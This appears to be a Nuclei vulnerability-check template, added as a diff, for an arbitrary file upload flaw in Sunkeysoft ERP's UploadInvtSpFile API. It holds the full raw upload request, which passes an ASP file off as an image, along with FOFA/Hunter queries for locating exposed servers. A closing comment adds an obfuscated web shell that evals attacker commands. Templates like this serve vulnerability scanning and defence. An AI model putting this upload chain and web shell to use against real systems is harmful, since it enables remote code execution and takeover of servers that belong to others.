@@ -1,0 +1,54 @@
+id: sunkeysoft-UploadInvtSpFile-rce
+info:
+  name: 顺景 ERP 管理系统 UploadInvtSpFile - fileupload
+  author: leadlife
+  severity: critical
+  description: 顺景ERP管理系统UploadInvtSpFile存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
+  reference: 
+    - https://blog.csdn.net/xc_214/article/details/142252506
+    - https://github.com/wy876/POC/blob/main/%E9%A1%BA%E6%99%AFERP/%E9%A1%BA%E6%99%AFERP%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUploadInvtSpFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/api/DBRecord/getDBRecords" || body="顺景软件 WebAPI 服务端"
+    hunter-query: web.body="/api/DBRecord/getDBRecords""
+  tags: sunkeysoft,erp,rce
+
+http:
+  - raw:
+      - |
+        POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=-----------------1111
+        Content-Length: 178
+
+        -------------------1111
+        Content-Disposition: form-data; name="filedata"; filename="2142142142.asp"
+        Content-Type: image/png
+
+        <% response.write("{{randstr}}")%>
+        -------------------1111--
+      
+      - |+
+        GET {{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors: 
+      - type: json
+        part: body_1
+        internal: true
+        name: filepath
+        json:
+          - ".filepath"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - contains_all(body_1,'filename','guid','filepath')
+          - contains(body_2,'{{randstr}}')
+        condition: and
+
+
+# get shell 'cmd'
+# <% function EfmB6149(){var GEPH="unsa",YACK="fe",C6E1=GEPH+YACK;return C6E1;}var PAY:String=Request["cmd"];~eval/*Zd0216312v*/(PAY,EfmB6149());%><%@Page Language = JS%>
